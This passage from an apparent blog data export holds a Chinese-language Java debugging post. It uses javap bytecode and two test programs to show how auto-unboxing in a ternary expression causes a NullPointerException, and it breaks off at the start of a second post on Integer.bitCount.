class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0: aconst_null</span><br><span class=\"line\">       1: astore        5</span><br><span class=\"line\">       3: aconst_null</span><br><span class=\"line\">       4: astore        6</span><br><span class=\"line\">       6: aload         4</span><br><span class=\"line\">       8: ldc2_w        #122                // long 4000l</span><br><span class=\"line\">      11: getstatic     #124                // Field com/xxx/service/im/MyTokenManager$RentType.SEARCH_CODE:Lcom/xxx/service/im/MyTokenManager$RentType;</span><br><span class=\"line\">      14: invokevirtual #125                // Method com/xxx/service/im/MyTokenManager.tryGetAvailableToken:(JLcom/xxx/service/im/MyTokenManager$RentType;)Lcom/xxx/service/im/MyTokenManager$MyTokenRenter;</span><br><span class=\"line\">      17: astore        5</span><br><span class=\"line\">      19: aload         5</span><br><span class=\"line\">      21: ifnonnull     94</span><br><span class=\"line\">      24: aconst_null</span><br><span class=\"line\">      25: astore        7</span><br><span class=\"line\">      27: aload         5</span><br><span class=\"line\">      29: ifnull        91</span><br><span class=\"line\">      32: aload         5</span><br><span class=\"line\">      34: aload         6</span><br><span class=\"line\">      36: ifnull        50</span><br><span class=\"line\">      39: aload         6</span><br><span class=\"line\">      41: invokevirtual #126                // Method com/xxx/store/vo/im/MySearchCodeVo.getRateLimitRemain:()Ljava/lang/Integer;</span><br><span class=\"line\">      44: invokevirtual #14                 // Method java/lang/Integer.intValue:()I</span><br><span class=\"line\">      47: goto          51</span><br><span class=\"line\">      50: iconst_1</span><br><span class=\"line\">      51: invokestatic  #45                 // Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer;</span><br><span class=\"line\">      54: aload         6</span><br><span class=\"line\">      56: ifnull        70</span><br><span class=\"line\">      59: aload         6</span><br><span class=\"line\">      61: invokevirtual #127                // Method com/xxx/store/vo/im/MySearchCodeVo.getRateLimitReset:()Ljava/lang/Long;</span><br><span class=\"line\">      64: invokevirtual #51                 // Method java/lang/Long.longValue:()J</span><br><span class=\"line\">      67: goto          71</span><br><span class=\"line\">      70: lconst_0</span><br><span class=\"line\">      71: invokestatic  #55                 // Method java/lang/Long.valueOf:(J)Ljava/lang/Long;</span><br><span class=\"line\">      74: aload         6</span><br><span class=\"line\">      76: ifnull        87</span><br><span class=\"line\">      79: aload         6</span><br><span class=\"line\">      81: invokevirtual #128                // Method com/xxx/store/vo/im/MySearchCodeVo.getRetryAfter:()Ljava/lang/Integer;</span><br><span class=\"line\">      84: goto          88</span><br><span class=\"line\">      87: aconst_null</span><br><span class=\"line\">      88: invokevirtual #129                // Method com/xxx/service/im/MyTokenManager$MyTokenRenter.giveBackToken:(Ljava/lang/Integer;Ljava/lang/Long;Ljava/lang/Integer;)V</span><br><span class=\"line\">      91: aload         7</span><br><span class=\"line\">      93: areturn</span><br><span class=\"line\">      94: aload         5</span><br><span class=\"line\">      96: invokevirtual #130                // Method com/xxx/service/im/MyTokenManager$MyTokenRenter.getToken:()Ljava/lang/Object;</span><br><span class=\"line\">      99: checkcast     #131                // class com/xxx/store/vo/im/MyToken</span><br><span class=\"line\">     102: astore        7</span><br><span class=\"line\">     104: aload_0</span><br><span class=\"line\">     105: aload_1</span><br><span class=\"line\">     106: iload_2</span><br><span class=\"line\">     107: iload_3</span><br><span class=\"line\">     108: aload         7</span><br><span class=\"line\">     110: invokevirtual #132                // Method com/xxx/store/vo/im/MyToken.getToken:()Ljava/lang/String;</span><br><span class=\"line\">     113: invokestatic  #133                // Method searchCodeList:(Ljava/lang/String;Ljava/lang/String;IILjava/lang/String;)Lcom/xxx/store/vo/im/MySearchCodeVo;</span><br><span class=\"line\">     116: astore        6</span><br><span class=\"line\">     118: aload         6</span><br><span class=\"line\">     120: astore        8</span><br><span class=\"line\">     122: aload         5</span><br><span class=\"line\">     124: ifnull        186</span><br><span class=\"line\">     127: aload         5</span><br><span class=\"line\">     129: aload         6</span><br><span class=\"line\">     131: ifnull        145</span><br><span class=\"line\">     134: aload         6</span><br><span class=\"line\">     136: invokevirtual #126                // Method com/xxx/store/vo/im/MySearchCodeVo.getRateLimitRemain:()Ljava/lang/Integer;</span><br><span class=\"line\">     139: invokevirtual #14                 // Method java/lang/Integer.intValue:()I</span><br><span class=\"line\">     142: goto          146</span><br><span class=\"line\">     145: iconst_1</span><br><span class=\"line\">     146: invokestatic  #45                 // Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer;</span><br><span class=\"line\">     149: aload         6</span><br><span class=\"line\">     151: ifnull        165</span><br><span class=\"line\">     154: aload         6</span><br><span class=\"line\">     156: invokevirtual #127                // Method com/xxx/store/vo/im/MySearchCodeVo.getRateLimitReset:()Ljava/lang/Long;</span><br><span class=\"line\">     159: invokevirtual #51                 // Method java/lang/Long.longValue:()J</span><br><span class=\"line\">     162: goto          166</span><br><span class=\"line\">     165: lconst_0</span><br><span class=\"line\">     166: invokestatic  #55                 // Method java/lang/Long.valueOf:(J)Ljava/lang/Long;</span><br><span class=\"line\">     169: aload         6</span><br><span class=\"line\">     171: ifnull        182</span><br><span class=\"line\">     174: aload         6</span><br><span class=\"line\">     176: invokevirtual #128                // Method com/xxx/store/vo/im/MySearchCodeVo.getRetryAfter:()Ljava/lang/Integer;</span><br><span class=\"line\">     179: goto          183</span><br><span class=\"line\">     182: aconst_null</span><br><span class=\"line\">     183: invokevirtual #129                // Method com/xxx/service/im/MyTokenManager$MyTokenRenter.giveBackToken:(Ljava/lang/Integer;Ljava/lang/Long;Ljava/lang/Integer;)V</span><br><span class=\"line\">     186: aload         8</span><br><span class=\"line\">     188: areturn</span><br><span class=\"line\">     189: astore        9</span><br><span class=\"line\">     191: aload         5</span><br><span class=\"line\">     193: ifnull        255</span><br><span class=\"line\">     196: aload         5</span><br><span class=\"line\">     198: aload         6</span><br><span class=\"line\">     200: ifnull        214</span><br><span class=\"line\">     203: aload         6</span><br><span class=\"line\">     205: invokevirtual #126                // Method com/xxx/store/vo/im/MySearchCodeVo.getRateLimitRemain:()Ljava/lang/Integer;</span><br><span class=\"line\">     208: invokevirtual #14                 // Method java/lang/Integer.intValue:()I</span><br><span class=\"line\">     211: goto          215</span><br><span class=\"line\">     214: iconst_1</span><br><span class=\"line\">     215: invokestatic  #45                 // Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer;</span><br><span class=\"line\">     218: aload         6</span><br><span class=\"line\">     220: ifnull        234</span><br><span class=\"line\">     223: aload         6</span><br><span class=\"line\">     225: invokevirtual #127                // Method com/xxx/store/vo/im/MySearchCodeVo.getRateLimitReset:()Ljava/lang/Long;</span><br><span class=\"line\">     228: invokevirtual #51                 // Method java/lang/Long.longValue:()J</span><br><span class=\"line\">     231: goto          235</span><br><span class=\"line\">     234: lconst_0</span><br><span class=\"line\">     235: invokestatic  #55                 // Method java/lang/Long.valueOf:(J)Ljava/lang/Long;</span><br><span class=\"line\">     238: aload         6</span><br><span class=\"line\">     240: ifnull        251</span><br><span class=\"line\">     243: aload         6</span><br><span class=\"line\">     245: invokevirtual #128                // Method com/xxx/store/vo/im/MySearchCodeVo.getRetryAfter:()Ljava/lang/Integer;</span><br><span class=\"line\">     248: goto          252</span><br><span class=\"line\">     251: aconst_null</span><br><span class=\"line\">     252: invokevirtual #129                // Method com/xxx/service/im/MyTokenManager$MyTokenRenter.giveBackToken:(Ljava/lang/Integer;Ljava/lang/Long;Ljava/lang/Integer;)V</span><br><span class=\"line\">     255: aload         9</span><br><span class=\"line\">     257: athrow</span><br></pre></td></tr></table></figure>\n\n<p>注意字节码中的这几行代码</p>\n<p><img src=\"../static/MB19061201-1.png\" alt=\"图片1\"></p>\n<p>发现<code>vo != null ? vo.getRateLimitRemain() : 1</code> 这个代码，会把<code>vo.getRateLimitRemain()</code>从Integer转成基础数据类型int，再转为Integer传给<code>giveBackToken</code>方法，而<code>vo != null ? vo.getRetryAfter() : null</code>这个代码，则不会转化为基础数据类型直接传给<code>giveBackToken</code>方法。说明了exp ? value1 : value2运算，value1和value2分别为基础数据类型和基础数据类型的包装类时，会统一转为基础数据类型。</p>\n<h2 id=\"测试验证\"><a href=\"#测试验证\" class=\"headerlink\" title=\"测试验证\"></a>测试验证</h2><p>测试代码1：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public static void main(String[] args) &#123;</span><br><span class=\"line\">    Tt tt = new Tt();</span><br><span class=\"line\">    tt.m = 6;</span><br><span class=\"line\">    test(tt != null ? tt.m : 2, tt != null ? tt.n : 6);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public static class Tt &#123;</span><br><span class=\"line\">    Integer m;</span><br><span class=\"line\">    Integer n;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">public static void test(Integer a, Integer b) &#123;</span><br><span class=\"line\">    System.out.println(a + &quot;--&quot; + b);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>运行结果为空指针异常</p>\n<p>测试代码2</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public static void main(String[] args) &#123;</span><br><span class=\"line\">    Tt tt = new Tt();</span><br><span class=\"line\">    tt.m = 6;</span><br><span class=\"line\">    test(tt != null ? tt.m : Integer.valueOf(2), tt != null ? tt.n : Integer.valueOf(6));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public static class Tt &#123;</span><br><span class=\"line\">    Integer m;</span><br><span class=\"line\">    Integer n;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">public static void test(Integer a, Integer b) &#123;</span><br><span class=\"line\">    System.out.println(a + &quot;--&quot; + b);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>正常输出结果：6–null</p>\n","site":{"data":{}},"excerpt":"","more":"<p>javap 命令可将Java class文件反汇编为字节码，借助该命令可排查一些特殊的bug</p>\n<h2 id=\"bug案例问题介绍\"><a href=\"#bug案例问题介绍\" class=\"headerlink\" title=\"bug案例问题介绍\"></a>bug案例问题介绍</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MyTokenManager.MyTokenRenter tokenRenter = null;</span><br><span class=\"line\">        MySearchCodeVo vo = null;</span><br><span class=\"line\">        try &#123;</span><br><span class=\"line\">            tokenRenter = tokenManager.tryGetAvailableToken(GET_TOKEN_DELAY, MyTokenManager.RentType.SEARCH_CODE);</span><br><span class=\"line\">            if (tokenRenter == null) &#123;</span><br><span class=\"line\">                return null;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            MyToken token = tokenRenter.getToken();</span><br><span class=\"line\">            vo = searchCodeList(keywords, scopes, page, perPage, token.getToken());</span><br><span class=\"line\">            return vo;</span><br><span class=\"line\">        &#125; finally &#123;</span><br><span class=\"line\">            if (tokenRenter != null) &#123;</span><br><span class=\"line\">                tokenRenter.giveBackToken(vo != null ? vo.getRateLimitRemain() : 1,       </span><br><span class=\"line\">                        vo != null ? vo.getRateLimitReset() : 0L, vo != null ? vo.getRetryAfter() : null);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br></pre></td></tr></table></figure>\n\n<p>上面代码运行，会出现偶现的NullPointerException，出现异常的代码位于<code>tokenRenter.giveBackToken(vo != null ? vo.getRateLimitRemain() : 1, vo != null ? vo.getRateLimitReset() : 0L, vo != null ? vo.getRetryAfter() : null)</code>，代码中涉及到的方法定义如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">void giveBackToken(Integer, Long, Integer);</span><br><span class=\"line\">Integer getRateLimitRemain();</span><br><span class=\"line\">Long getRateLimitReset();</span><br><span class=\"line\">Integer getRetryAfter();</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"问题排查步骤\"><a href=\"#问题排查步骤\" class=\"headerlink\" title=\"问题排查步骤\"></a>问题排查步骤</h2><p>使用javap命令对class文件进行反汇编，生成字节码</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">javap -c com.xxxx.xxxx.Myxxxx</span><br></pre></td></tr></table></figure>\n\n<p>得到字节码信息，字节码中相关代码如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">0: aconst_null</span><br><span class=\"line\">       1: astore        5</span><br><span class=\"line\">       3: aconst_null</span><br><span class=\"line\">       4: astore        6</span><br><span class=\"line\">       6: aload         4</span><br><span class=\"line\">       8: ldc2_w        #122                // long 4000l</span><br><span class=\"line\">      11: getstatic     #124                // Field com/xxx/service/im/MyTokenManager$RentType.SEARCH_CODE:Lcom/xxx/service/im/MyTokenManager$RentType;</span><br><span class=\"line\">      14: invokevirtual #125                // Method com/xxx/service/im/MyTokenManager.tryGetAvailableToken:(JLcom/xxx/service/im/MyTokenManager$RentType;)Lcom/xxx/service/im/MyTokenManager$MyTokenRenter;</span><br><span class=\"line\">      17: astore        5</span><br><span class=\"line\">      19: aload         5</span><br><span class=\"line\">      21: ifnonnull     94</span><br><span class=\"line\">      24: aconst_null</span><br><span class=\"line\">      25: astore        7</span><br><span class=\"line\">      27: aload         5</span><br><span class=\"line\">      29: ifnull        91</span><br><span class=\"line\">      32: aload         5</span><br><span class=\"line\">      34: aload         6</span><br><span class=\"line\">      36: ifnull        50</span><br><span class=\"line\">      39: aload         6</span><br><span class=\"line\">      41: invokevirtual #126                // Method com/xxx/store/vo/im/MySearchCodeVo.getRateLimitRemain:()Ljava/lang/Integer;</span><br><span class=\"line\">      44: invokevirtual #14                 // Method java/lang/Integer.intValue:()I</span><br><span class=\"line\">      47: goto          51</span><br><span class=\"line\">      50: iconst_1</span><br><span class=\"line\">      51: invokestatic  #45                 // Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer;</span><br><span class=\"line\">      54: aload         6</span><br><span class=\"line\">      56: ifnull        70</span><br><span class=\"line\">      59: aload         6</span><br><span class=\"line\">      61: invokevirtual #127                // Method com/xxx/store/vo/im/MySearchCodeVo.getRateLimitReset:()Ljava/lang/Long;</span><br><span class=\"line\">      64: invokevirtual #51                 // Method java/lang/Long.longValue:()J</span><br><span class=\"line\">      67: goto          71</span><br><span class=\"line\">      70: lconst_0</span><br><span class=\"line\">      71: invokestatic  #55                 // Method java/lang/Long.valueOf:(J)Ljava/lang/Long;</span><br><span class=\"line\">      74: aload         6</span><br><span class=\"line\">      76: ifnull        87</span><br><span class=\"line\">      79: aload         6</span><br><span class=\"line\">      81: invokevirtual #128                // Method com/xxx/store/vo/im/MySearchCodeVo.getRetryAfter:()Ljava/lang/Integer;</span><br><span class=\"line\">      84: goto          88</span><br><span class=\"line\">      87: aconst_null</span><br><span class=\"line\">      88: invokevirtual #129                // Method com/xxx/service/im/MyTokenManager$MyTokenRenter.giveBackToken:(Ljava/lang/Integer;Ljava/lang/Long;Ljava/lang/Integer;)V</span><br><span class=\"line\">      91: aload         7</span><br><span class=\"line\">      93: areturn</span><br><span class=\"line\">      94: aload         5</span><br><span class=\"line\">      96: invokevirtual #130                // Method com/xxx/service/im/MyTokenManager$MyTokenRenter.getToken:()Ljava/lang/Object;</span><br><span class=\"line\">      99: checkcast     #131                // class com/xxx/store/vo/im/MyToken</span><br><span class=\"line\">     102: astore        7</span><br><span class=\"line\">     104: aload_0</span><br><span class=\"line\">     105: aload_1</span><br><span class=\"line\">     106: iload_2</span><br><span class=\"line\">     107: iload_3</span><br><span class=\"line\">     108: aload         7</span><br><span class=\"line\">     110: invokevirtual #132                // Method com/xxx/store/vo/im/MyToken.getToken:()Ljava/lang/String;</span><br><span class=\"line\">     113: invokestatic  #133                // Method searchCodeList:(Ljava/lang/String;Ljava/lang/String;IILjava/lang/String;)Lcom/xxx/store/vo/im/MySearchCodeVo;</span><br><span class=\"line\">     116: astore        6</span><br><span class=\"line\">     118: aload         6</span><br><span class=\"line\">     120: astore        8</span><br><span class=\"line\">     122: aload         5</span><br><span class=\"line\">     124: ifnull        186</span><br><span class=\"line\">     127: aload         5</span><br><span class=\"line\">     129: aload         6</span><br><span class=\"line\">     131: ifnull        145</span><br><span class=\"line\">     134: aload         6</span><br><span class=\"line\">     136: invokevirtual #126                // Method com/xxx/store/vo/im/MySearchCodeVo.getRateLimitRemain:()Ljava/lang/Integer;</span><br><span class=\"line\">     139: invokevirtual #14                 // Method java/lang/Integer.intValue:()I</span><br><span class=\"line\">     142: goto          146</span><br><span class=\"line\">     145: iconst_1</span><br><span class=\"line\">     146: invokestatic  #45                 // Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer;</span><br><span class=\"line\">     149: aload         6</span><br><span class=\"line\">     151: ifnull        165</span><br><span class=\"line\">     154: aload         6</span><br><span class=\"line\">     156: invokevirtual #127                // Method com/xxx/store/vo/im/MySearchCodeVo.getRateLimitReset:()Ljava/lang/Long;</span><br><span class=\"line\">     159: invokevirtual #51                 // Method java/lang/Long.longValue:()J</span><br><span class=\"line\">     162: goto          166</span><br><span class=\"line\">     165: lconst_0</span><br><span class=\"line\">     166: invokestatic  #55                 // Method java/lang/Long.valueOf:(J)Ljava/lang/Long;</span><br><span class=\"line\">     169: aload         6</span><br><span class=\"line\">     171: ifnull        182</span><br><span class=\"line\">     174: aload         6</span><br><span class=\"line\">     176: invokevirtual #128                // Method com/xxx/store/vo/im/MySearchCodeVo.getRetryAfter:()Ljava/lang/Integer;</span><br><span class=\"line\">     179: goto          183</span><br><span class=\"line\">     182: aconst_null</span><br><span class=\"line\">     183: invokevirtual #129                // Method com/xxx/service/im/MyTokenManager$MyTokenRenter.giveBackToken:(Ljava/lang/Integer;Ljava/lang/Long;Ljava/lang/Integer;)V</span><br><span class=\"line\">     186: aload         8</span><br><span class=\"line\">     188: areturn</span><br><span class=\"line\">     189: astore        9</span><br><span class=\"line\">     191: aload         5</span><br><span class=\"line\">     193: ifnull        255</span><br><span class=\"line\">     196: aload         5</span><br><span class=\"line\">     198: aload         6</span><br><span class=\"line\">     200: ifnull        214</span><br><span class=\"line\">     203: aload         6</span><br><span class=\"line\">     205: invokevirtual #126                // Method com/xxx/store/vo/im/MySearchCodeVo.getRateLimitRemain:()Ljava/lang/Integer;</span><br><span class=\"line\">     208: invokevirtual #14                 // Method java/lang/Integer.intValue:()I</span><br><span class=\"line\">     211: goto          215</span><br><span class=\"line\">     214: iconst_1</span><br><span class=\"line\">     215: invokestatic  #45                 // Method java/lang/Integer.valueOf:(I)Ljava/lang/Integer;</span><br><span class=\"line\">     218: aload         6</span><br><span class=\"line\">     220: ifnull        234</span><br><span class=\"line\">     223: aload         6</span><br><span class=\"line\">     225: invokevirtual #127                // Method com/xxx/store/vo/im/MySearchCodeVo.getRateLimitReset:()Ljava/lang/Long;</span><br><span class=\"line\">     228: invokevirtual #51                 // Method java/lang/Long.longValue:()J</span><br><span class=\"line\">     231: goto          235</span><br><span class=\"line\">     234: lconst_0</span><br><span class=\"line\">     235: invokestatic  #55                 // Method java/lang/Long.valueOf:(J)Ljava/lang/Long;</span><br><span class=\"line\">     238: aload         6</span><br><span class=\"line\">     240: ifnull        251</span><br><span class=\"line\">     243: aload         6</span><br><span class=\"line\">     245: invokevirtual #128                // Method com/xxx/store/vo/im/MySearchCodeVo.getRetryAfter:()Ljava/lang/Integer;</span><br><span class=\"line\">     248: goto          252</span><br><span class=\"line\">     251: aconst_null</span><br><span class=\"line\">     252: invokevirtual #129                // Method com/xxx/service/im/MyTokenManager$MyTokenRenter.giveBackToken:(Ljava/lang/Integer;Ljava/lang/Long;Ljava/lang/Integer;)V</span><br><span class=\"line\">     255: aload         9</span><br><span class=\"line\">     257: athrow</span><br></pre></td></tr></table></figure>\n\n<p>注意字节码中的这几行代码</p>\n<p><img src=\"../static/MB19061201-1.png\" alt=\"图片1\"></p>\n<p>发现<code>vo != null ? vo.getRateLimitRemain() : 1</code> 这个代码，会把<code>vo.getRateLimitRemain()</code>从Integer转成基础数据类型int，再转为Integer传给<code>giveBackToken</code>方法，而<code>vo != null ? vo.getRetryAfter() : null</code>这个代码，则不会转化为基础数据类型直接传给<code>giveBackToken</code>方法。说明了exp ? value1 : value2运算，value1和value2分别为基础数据类型和基础数据类型的包装类时，会统一转为基础数据类型。</p>\n<h2 id=\"测试验证\"><a href=\"#测试验证\" class=\"headerlink\" title=\"测试验证\"></a>测试验证</h2><p>测试代码1：</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public static void main(String[] args) &#123;</span><br><span class=\"line\">    Tt tt = new Tt();</span><br><span class=\"line\">    tt.m = 6;</span><br><span class=\"line\">    test(tt != null ? tt.m : 2, tt != null ? tt.n : 6);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public static class Tt &#123;</span><br><span class=\"line\">    Integer m;</span><br><span class=\"line\">    Integer n;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">public static void test(Integer a, Integer b) &#123;</span><br><span class=\"line\">    System.out.println(a + &quot;--&quot; + b);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>运行结果为空指针异常</p>\n<p>测试代码2</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">public static void main(String[] args) &#123;</span><br><span class=\"line\">    Tt tt = new Tt();</span><br><span class=\"line\">    tt.m = 6;</span><br><span class=\"line\">    test(tt != null ? tt.m : Integer.valueOf(2), tt != null ? tt.n : Integer.valueOf(6));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">public static class Tt &#123;</span><br><span class=\"line\">    Integer m;</span><br><span class=\"line\">    Integer n;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">public static void test(Integer a, Integer b) &#123;</span><br><span class=\"line\">    System.out.println(a + &quot;--&quot; + b);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>正常输出结果：6–null</p>\n"},{"title":"JDK中Integer.bitCount解析","date":"2019-12-11T11:11:49.000Z","keywords":"Java, Integer, bitCount","rId":"MB-19121101","_content":"\n使用过Redis的人可能知道，Redis中给我们提供了统计二进制位数为1的位数量的指令`bitcout`，JDK中Integer类同样也给我们提供了该功能的方法`Integer.bigCount`，得益于此，我们很容易就能一窥该方法的实现\n\n```\n    public static int bitCount(int i) {\n        // HD, Figure 5-2\n        i = i - ((i >>> 1) & 0x55555555);\n        i = (i & 0x33333333) + ((i >>> 2) & 0x33333333);\n        i = (i + (i >>> 4)) & 0x0f0f0f0f;\n        i = i + (i >>> 8);\n        i = i + (i >>> 16);\n        return i & 0x3f;\n    